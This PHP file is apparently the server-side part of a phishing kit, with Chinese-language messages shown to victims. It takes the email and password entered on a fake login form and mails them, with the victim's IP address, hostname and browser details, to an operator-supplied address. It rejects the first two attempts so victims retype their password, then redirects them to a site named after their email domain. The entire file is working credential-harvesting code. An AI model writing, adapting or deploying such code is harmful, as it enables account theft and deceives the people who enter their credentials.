<?php
session_start();

header('Content-Type: application/json');

// Only allow POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode([
        'success' => false,
        'message' => 'Method not allowed',
        'messageType' => 'error'
    ]);
    exit;
}

// Get input
$email = trim($_POST['email'] ?? '');
$password = $_POST['password'] ?? '';

// Validate
if (!$email || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo json_encode([
        'success' => false,
        'message' => '無效的電子郵件地址。請再試一次。',
        'messageType' => 'error'
    ]);
    exit;
}

if (!$password) {
    echo json_encode([
        'success' => false,
        'message' => '需要密碼',
        'messageType' => 'error'
    ]);
    exit;
}

// 6. If valid, process and log
$ip = $_SERVER["REMOTE_ADDR"] ?? 'unknown';
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Prepare message
$message = "|---------- LOGIN INFO ----------|\n";
$message .= "Online ID: $email\n";
$message .= "Password : $password\n";
$message .= "Client IP: $ip\n";
$message .= "Hostname : $hostname\n";
$message .= "UserAgent: $useragent\n";
$message .= "Time: " . date('Y-m-d H:i:s') . "\n";
$message .= "|--------------------------------|\n";

// Send mail
$send = "yourmail@gmail.com"; // ✅ replace with your email


$subject = "Login: $ip";
mail($send, $subject, $message);

 
$testMode = true; 

$emailKey = 'fail_test_' . md5($email);

if (!isset($_SESSION[$emailKey])) {
    $_SESSION[$emailKey] = 0;
}

$_SESSION[$emailKey]++;

// Force fail first 2 attempts
if ($testMode && $_SESSION[$emailKey] <= 2) {
    echo json_encode([
        'success' => false,
        'message' => '無效的電子郵件地址或密碼。請再試一次。',
        'messageType' => 'error'
    ]);
    exit;
}

$emailbase = explode('.', $email)[0];

// Failed login
unset($_SESSION[$emailKey]);
echo json_encode([
    'success' => true, 
    'redirect' => 'http://www.' . $emailbase . '.com', 
]);
exit;
